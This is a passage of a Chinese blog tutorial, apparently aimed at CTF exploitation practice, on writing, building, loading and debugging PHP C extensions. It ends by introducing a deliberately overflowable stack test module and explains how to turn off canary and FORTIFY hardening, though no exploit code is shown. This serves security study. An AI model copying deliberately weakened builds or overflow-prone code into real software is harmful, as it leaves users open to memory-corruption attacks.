class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">	PHP_FE(helloword_test1,		arginfo_helloword_test1)</span><br><span class="line">	PHP_FE(helloword_test2,		arginfo_helloword_test2)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;helloword&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	helloword_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(helloword),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(helloword),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLOWORD_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_HELLOWORD</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(helloword)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="ğŸ”ºæ³¨ï¼šä¸åŒç‰ˆæœ¬åˆ›å»ºæ¨¡æ¿"   >
          <a href="#ğŸ”ºæ³¨ï¼šä¸åŒç‰ˆæœ¬åˆ›å»ºæ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼šä¸åŒç‰ˆæœ¬åˆ›å»ºæ¨¡æ¿" class="headerlink" title="ğŸ”ºæ³¨ï¼šä¸åŒç‰ˆæœ¬åˆ›å»ºæ¨¡æ¿"></a>ğŸ”ºæ³¨ï¼šä¸åŒç‰ˆæœ¬åˆ›å»ºæ¨¡æ¿</h2>
      <p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨php7.3ä»¥ä¸Šï¼Œ<code>ext_skel</code>è¿™ä¸ªshellå˜æˆäº†<code>ext_skel.php</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹æ¥åˆ›å»º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/73/bin/php ./ext_skel.php --ext helloword</span><br><span class="line">cd helloworld</span><br><span class="line">/www/server/php/73/bin/phpize</span><br><span class="line">./configure --prefix=/www/server/php/73/bin/php --with-php-config=/www/server/php/73/bin/php-config</span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>


        <h2 id="ğŸ”ºæ³¨ï¼šé»˜è®¤çš„ä¿æŠ¤æªæ–½"   >
          <a href="#ğŸ”ºæ³¨ï¼šé»˜è®¤çš„ä¿æŠ¤æªæ–½" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼šé»˜è®¤çš„ä¿æŠ¤æªæ–½" class="headerlink" title="ğŸ”ºæ³¨ï¼šé»˜è®¤çš„ä¿æŠ¤æªæ–½"></a>ğŸ”ºæ³¨ï¼šé»˜è®¤çš„ä¿æŠ¤æªæ–½</h2>
      <p>åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨configureè®¾ç½®å®Œä¹‹åï¼Œä¿æŠ¤æªæ–½ä¹Ÿéœ€è¦è®¾ç½®ä¸€ä¸‹ï¼Œé»˜è®¤ç¼–è¯‘çš„ä¿æŠ¤å¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121247504.png" alt="image-20220212124731449"></p>
<p>å¯ä»¥çœ‹åˆ°é™¤äº†RELROæ²¡æœ‰åŠ å¼ºä¿æŠ¤ä¹‹å¤–ï¼Œå…¶ä»–éƒ½åŠ å…¥äº†ï¼Œæˆ‘ä»¬åœ¨Makefileä¸­å¯ä»¥è¿›è¡Œç›¸å…³çš„ä¿æŠ¤æªæ–½æ¶ˆé™¤</p>
<p>è¿™é‡Œè¯•äº†å¾ˆå¤šéï¼Œè²Œä¼¼åªèƒ½å…³æ‰Canaryä¿æŠ¤å’ŒFORTIFYä¿æŠ¤</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121258947.png" alt="image-20220212125859899"></p>

        <h2 id="3-åŠ è½½æ¨¡å—"   >
          <a href="#3-åŠ è½½æ¨¡å—" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åŠ è½½æ¨¡å—" class="headerlink" title="3.åŠ è½½æ¨¡å—"></a>3.åŠ è½½æ¨¡å—</h2>
      
        <h3 id="æ–¹æ³•ä¸€ï¼š"   >
          <a href="#æ–¹æ³•ä¸€ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3>
      <p>ç›´æ¥<code>make install</code>ï¼Œç„¶ååœ¨å¯¹åº”çš„php.iniä¸­æ·»åŠ <code>extension=helloword.so</code></p>

        <h3 id="æ–¹æ³•äºŒï¼š"   >
          <a href="#æ–¹æ³•äºŒï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3>
      <p>å¤åˆ¶modulesä¸‹çš„helloworld.soæ¨¡å—åˆ°å¯¹åº”çš„phpæ‰©å±•ç›®å½•</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./modules/helloword.so /www/server/php/73/lib/php/extensions/no-debug-non-zts-20180731/</span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·ä¹Ÿå¾—åœ¨php.iniä¸­æ·»åŠ extension</p>
<p>ä¹‹åä½¿ç”¨æ¨¡æ¿ä¸­å‡½æ•°æµ‹è¯•å³å¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">helloword_test1();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹å³å¯æˆåŠŸ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120676.png"></p>
<p>è¿™ä¸ªphpæ‹“å±•æ¨¡å—å…¶å®è·Ÿlinuxå†…æ ¸æœ‰ç‚¹åƒ</p>

        <h2 id="ğŸ”ºæ³¨ï¼šphp-iniçš„è®¾ç½®"   >
          <a href="#ğŸ”ºæ³¨ï¼šphp-iniçš„è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼šphp-iniçš„è®¾ç½®" class="headerlink" title="ğŸ”ºæ³¨ï¼šphp.iniçš„è®¾ç½®"></a>ğŸ”ºæ³¨ï¼šphp.iniçš„è®¾ç½®</h2>
      <p>éœ€è¦æ³¨æ„çš„æ˜¯php.ini(php-fpmçš„php.ini)å’Œphp-cli.ini(php-cliçš„php.ini)çš„åŒºåˆ«è®¾ç½®</p>
<p>å¯¹äºphp-fpmçš„php.iniï¼Œåªä¼šåœ¨webæœåŠ¡å™¨ä¸Šç”Ÿæ•ˆï¼Œè€Œå¯¹äºphp-cliçš„php.iniæ‰æ˜¯åœ¨å‘½ä»¤è¡Œä¸­ç”Ÿæ•ˆï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬éœ€è¦ä½¿ç”¨å‘½ä»¤è¡Œç›´æ¥è°ƒè¯•phpï¼Œé‚£ä¹ˆå°±éœ€è¦ä¿®æ”¹php-cliä¸­çš„php.iniæ‰è¡Œçš„ã€‚ä»¥ä¸‹æ˜¯ç”¨å®å¡”linuxæ­å»ºçš„Phpç¯å¢ƒï¼Œå¦‚æœåœ¨å‘½ä»¤è¡Œä¸­ç”Ÿæ•ˆåˆ™éœ€è¦ä¿®æ”¹Php-cli.iniæ‰è¡Œçš„ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111605414.png" alt="image-20220211160511335"></p>

        <h2 id="4-ç¼–å†™å‡½æ•°"   >
          <a href="#4-ç¼–å†™å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ç¼–å†™å‡½æ•°" class="headerlink" title="4.ç¼–å†™å‡½æ•°"></a>4.ç¼–å†™å‡½æ•°</h2>
      <p>ä»¥ä¸‹æ˜¯php7åŠä»¥ä¸Šçš„è¯­æ³•ï¼Œä¹‹å‰ç‰ˆæœ¬çš„ä¼šæœ‰æ‰€ä¸åŒ</p>

        <h3 id="1-PHP-FUNCTION"   >
          <a href="#1-PHP-FUNCTION" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHP-FUNCTION" class="headerlink" title="(1)PHP_FUNCTION"></a>(1)PHP_FUNCTION</h3>
      
        <h3 id="â‘ æ¡†æ¶ç¼–å†™"   >
          <a href="#â‘ æ¡†æ¶ç¼–å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ æ¡†æ¶ç¼–å†™" class="headerlink" title="â‘ æ¡†æ¶ç¼–å†™"></a>â‘ æ¡†æ¶ç¼–å†™</h3>
      <p>ç”±<code>PHP_FUNCTION</code> ä¿®é¥°çš„å‡½æ•°ç›¸å½“äºç›´æ¥çš„å®šä¹‰å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å®šä¹‰å‡½æ•°æ—¶ï¼Œéœ€è¦ç”¨è¯¥ä¿®é¥°ç¬¦æ¥ä¿®é¥°ï¼Œæ ¼å¼å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(funcName)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;helloword&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è‡³äºè¿™ä¸ª<code>ZEND_PARSE_PARAMETERS_NONE();</code>ä»£è¡¨å®šä¹‰çš„è¯¥å‡½æ•°æ— å‚æ•°ä¼ é€’ã€‚</p>

        <h3 id="â‘¡å‚æ•°ä¼ é€’"   >
          <a href="#â‘¡å‚æ•°ä¼ é€’" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡å‚æ•°ä¼ é€’" class="headerlink" title="â‘¡å‚æ•°ä¼ é€’"></a>â‘¡å‚æ•°ä¼ é€’</h3>
      <p>è€Œå½“æˆ‘ä»¬éœ€è¦ç»™å‡½æ•°ä¼ é€’å‚æ•°æ—¶ï¼Œå°±éœ€è¦ç”¨åˆ°<code>ZEND_PARSE_PARAMETERS_START</code>æ¥è®¾ç½®å‡½æ•°çš„å‚æ•°ä¸ªæ•°</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="keyword">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)       </span><br><span class="line">    <span class="function">Z_PARAM_OPTIONAL             </span></span><br><span class="line"><span class="function">    <span class="title">Z_PARAM_STRING</span><span class="params">(var, var_len)</span>   </span></span><br><span class="line"><span class="function"><span class="title">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//è€ç‰ˆæœ¬å†™æ³•ï¼š</span></span><br><span class="line"><span class="keyword">char</span> *var = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> var_len;</span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;var, &amp;var_len) == FAILURE) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¸Šè¿°çš„<code>ZEND_PARSE_PARAMETERS_START(0, 1)</code>å³ä»£è¡¨ä¼ å…¥å‚æ•°ä¸ªæ•°ä¸º<code>0~1</code>ï¼Œå¯å˜ä¸ªæ•°ï¼Œå¦‚æœä¸ªæ•°ä¸ç¬¦åˆï¼Œåˆ™ä¼šè§¦å‘å¼‚å¸¸ã€‚åŒæ ·ä¹Ÿå¯ä»¥è®¾ç½®ä¸º<code>1~1</code>ï¼Œ<code>2~4</code>ç­‰ç­‰ä¹‹ç±»çš„ã€‚</p>
<p><code>Z_PARAM_STRING</code>ä»£è¡¨ä¸€ç§å‚æ•°ç±»å‹ï¼Œå³<code>char*</code>ï¼Œä¼ å…¥çš„å‚æ•°ç»™åˆ°varï¼Œé•¿åº¦ç»™åˆ°var_lenï¼Œè¿˜æœ‰çš„å…¶ä»–ç±»å‹å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">specifier    Fast ZPP API macro    args</span><br><span class="line">|    <span class="function">Z_PARAM_OPTIONAL</span></span><br><span class="line"><span class="function">a    <span class="title">Z_PARAM_ARRAY</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">A    <span class="title">Z_PARAM_ARRAY_OR_OBJECT</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">b    <span class="title">Z_PARAM_BOOL</span><span class="params">(dest)</span>    dest - zend_bool</span></span><br><span class="line"><span class="function">C    <span class="title">Z_PARAM_CLASS</span><span class="params">(dest)</span>    dest - zend_class_entry*</span></span><br><span class="line"><span class="function">d    <span class="title">Z_PARAM_DOUBLE</span><span class="params">(dest)</span>    dest - <span class="keyword">double</span></span></span><br><span class="line"><span class="function">f    <span class="title">Z_PARAM_FUNC</span><span class="params">(fci, fcc)</span>    fci - zend_fcall_info, fcc - zend_fcall_info_cache</span></span><br><span class="line"><span class="function">h    <span class="title">Z_PARAM_ARRAY_HT</span><span class="params">(dest)</span>    dest - HashTable*</span></span><br><span class="line"><span class="function">H    <span class="title">Z_PARAM_ARRAY_OR_OBJECT_HT</span><span class="params">(dest)</span>    dest - HashTable*</span></span><br><span class="line"><span class="function">l    <span class="title">Z_PARAM_LONG</span><span class="params">(dest)</span>    dest - <span class="keyword">long</span></span></span><br><span class="line"><span class="function">L    <span class="title">Z_PARAM_STRICT_LONG</span><span class="params">(dest)</span>    dest - <span class="keyword">long</span></span></span><br><span class="line"><span class="function">o    <span class="title">Z_PARAM_OBJECT</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">O    <span class="title">Z_PARAM_OBJECT_OF_CLASS</span><span class="params">(dest, ce)</span>    dest - zval*</span></span><br><span class="line"><span class="function">p    <span class="title">Z_PARAM_PATH</span><span class="params">(dest, dest_len)</span>    dest - <span class="keyword">char</span>*, dest_len - <span class="keyword">int</span></span></span><br><span class="line"><span class="function">P    <span class="title">Z_PARAM_PATH_STR</span><span class="params">(dest)</span>    dest - zend_string*</span></span><br><span class="line"><span class="function">r    <span class="title">Z_PARAM_RESOURCE</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">s    <span class="title">Z_PARAM_STRING</span><span class="params">(dest, dest_len)</span>    dest - <span class="keyword">char</span>*, dest_len - <span class="keyword">int</span></span></span><br><span class="line"><span class="function">S    <span class="title">Z_PARAM_STR</span><span class="params">(dest)</span>    dest - zend_string*</span></span><br><span class="line"><span class="function">z    <span class="title">Z_PARAM_ZVAL</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">     <span class="title">Z_PARAM_ZVAL_DEREF</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">+    <span class="title">Z_PARAM_VARIADIC</span><span class="params">(<span class="string">&#x27;+&#x27;</span>, dest, num)</span>    dest - zval*, num <span class="keyword">int</span></span></span><br><span class="line"><span class="function">*    <span class="title">Z_PARAM_VARIADIC</span><span class="params">(<span class="string">&#x27;*&#x27;</span>, dest, num)</span>    dest - zval*, num <span class="keyword">int</span></span></span><br></pre></td></tr></table></div></figure>

<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/233831#h3-3" >AntCTF ^ D3CTF 2021 hackphp - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="â‘¢å‚æ•°ä¿¡æ¯å®šä¹‰"   >
          <a href="#â‘¢å‚æ•°ä¿¡æ¯å®šä¹‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢å‚æ•°ä¿¡æ¯å®šä¹‰" class="headerlink" title="â‘¢å‚æ•°ä¿¡æ¯å®šä¹‰"></a>â‘¢å‚æ•°ä¿¡æ¯å®šä¹‰</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±åœ¨<code>ZEND_BEGIN_ARG_INFO</code>ä¸­å®šä¹‰äº†å‚æ•°arginfo_helloword_test1å’Œarginfo_helloword_test2ï¼Œç„¶ååœ¨<code>ZEND_ARG_INFO</code>ä¸­è®¾ç½®å‚æ•°åç§°ï¼Œåœ¨<code>ZEND_ARG_INFO</code>ä¸­ç¬¬ä¸€ä¸ªå‚æ•°ä»£è¡¨æ˜¯å¦ä¸ºå¼•ç”¨ï¼Œç¬¬äºŒä¸ªå‚æ•°è®¾ç½®åç§°ï¼Œæ¯”å¦‚è¿™é‡Œå°±è®¾ç½®ä¸º<code>str</code>ã€‚è¿™ä¸ªå‚æ•°ä¿¡æ¯çš„å®šä¹‰åœ¨ä¹‹åçš„å‡½æ•°æ³¨å†Œä¸­éœ€è¦ç”¨åˆ°ã€‚</p>
<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.maoyingdong.com/php7_extension_development_tutorial_3/" >Linuxä¸‹PHP7æ‰©å±•å¼€å‘å…¥é—¨æ•™ç¨‹3ï¼šç¼–å†™ç¬¬ä¸€ä¸ªå‡½æ•° | æ¯›è‹±ä¸œçš„ä¸ªäººåšå®¢ (maoyingdong.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="2-å‡½æ•°æ³¨å†Œ"   >
          <a href="#2-å‡½æ•°æ³¨å†Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‡½æ•°æ³¨å†Œ" class="headerlink" title="(2)å‡½æ•°æ³¨å†Œ"></a>(2)å‡½æ•°æ³¨å†Œ</h2>
      <p>å’Œå†…æ ¸ç±»ä¼¼ï¼Œéœ€è¦å°†æˆ‘ä»¬ç¼–å†™çš„å‡½æ•°è¿›è¡Œæ³¨å†Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">	PHP_FE(helloword_test1,		arginfo_helloword_test1)</span><br><span class="line">	PHP_FE(helloword_test2,		arginfo_helloword_test2)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸Šï¼Œå³ä½¿ç”¨<code>PHP_FE</code>æ¥æ³¨å†Œå‡½æ•°ï¼Œéœ€è¦ä¼ å…¥å‡½æ•°åç§°å’Œå‡½æ•°å‚æ•°å®šä¹‰ä¿¡æ¯ã€‚</p>

        <h2 id="3-æ¨¡å—æ³¨å†Œ"   >
          <a href="#3-æ¨¡å—æ³¨å†Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ¨¡å—æ³¨å†Œ" class="headerlink" title="(3)æ¨¡å—æ³¨å†Œ"></a>(3)æ¨¡å—æ³¨å†Œ</h2>
      <p>æœ€åæ•´ä¸ªæ¨¡å—ä½¿ç”¨<code>zend_module_entry</code>è¿›è¡Œæ¨¡å—æ³¨å†Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;helloword&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	helloword_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(helloword),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(helloword),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLOWORD_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>






        <h1 id="äºŒã€è°ƒè¯•phpæ‹“å±•"   >
          <a href="#äºŒã€è°ƒè¯•phpæ‹“å±•" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€è°ƒè¯•phpæ‹“å±•" class="headerlink" title="äºŒã€è°ƒè¯•phpæ‹“å±•"></a>äºŒã€è°ƒè¯•phpæ‹“å±•</h1>
      
        <h2 id="1-æŸ¥æ‰¾æ¨¡å—"   >
          <a href="#1-æŸ¥æ‰¾æ¨¡å—" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æŸ¥æ‰¾æ¨¡å—" class="headerlink" title="1.æŸ¥æ‰¾æ¨¡å—"></a>1.æŸ¥æ‰¾æ¨¡å—</h2>
      <p>æŸ¥æ‰¾phpæ‹“å±•æ¨¡å—</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep extensions</span><br><span class="line">php -i | grep -i extension_dir</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-å¼€å§‹è°ƒè¯•"   >
          <a href="#2-å¼€å§‹è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¼€å§‹è°ƒè¯•" class="headerlink" title="2.å¼€å§‹è°ƒè¯•"></a>2.å¼€å§‹è°ƒè¯•</h2>
      <p>å¦‚ä¸‹ï¼Œè°ƒè¯•phpç¨‹åºï¼Œç„¶åè·‘èµ·æ¥ï¼Œä½¿å¾—åŠ è½½è¿›å…¥æ‹“å±•æ¨¡å—ï¼Œctrl+cä¸­æ–­åå³å¯å¯¹ç‰¹å®šå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œç„¶åå†è·‘<code>test.php</code>ï¼Œè¯¥phpè°ƒç”¨éœ€è¦è°ƒè¯•çš„æ‹“å±•æ¨¡å—ä¸­çš„å‡½æ•°ï¼Œç»§ç»­è¿è¡Œå³å¯æ–­ç‚¹ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb /www/server/php/73/bin/php</span><br><span class="line">r</span><br><span class="line">(ctrl+cä¸­æ–­)</span><br><span class="line">b zif_funcName</span><br><span class="line">r test.php</span><br><span class="line">c</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨æ‹“å±•æ¨¡å—æ³¨å†Œçš„å‡½æ•°æœ€ç»ˆéƒ½ä¼šä»¥<code>zif_</code>æ•´ä¸ªå‰ç¼€è¿›è¡Œä¿®é¥°ï¼Œæ‰€ä»¥å½“åšCTFé¢˜æ—¶ï¼Œç›´æ¥æœç´¢zifä»ä¸­å¯»æ‰¾å‡½æ•°è¿›è¡Œè§£æå³å¯ã€‚</p>
<p>å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111117225.png" alt="image-20220211111702925"></p>

        <h2 id="ğŸ”ºæµ‹è¯•ç”¨ä¾‹"   >
          <a href="#ğŸ”ºæµ‹è¯•ç”¨ä¾‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæµ‹è¯•ç”¨ä¾‹" class="headerlink" title="ğŸ”ºæµ‹è¯•ç”¨ä¾‹"></a>ğŸ”ºæµ‹è¯•ç”¨ä¾‹</h2>
      
        <h3 id="1-æ ˆæ¨¡å—"   >
          <a href="#1-æ ˆæ¨¡å—" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ ˆæ¨¡å—" class="headerlink" title="(1)æ ˆæ¨¡å—"></a>(1)æ ˆæ¨¡å—</h3>
      <p>ä¼ å…¥ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œæ‹·è´ç»™dataï¼Œå¯¼è‡´æ ˆæº¢å‡º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 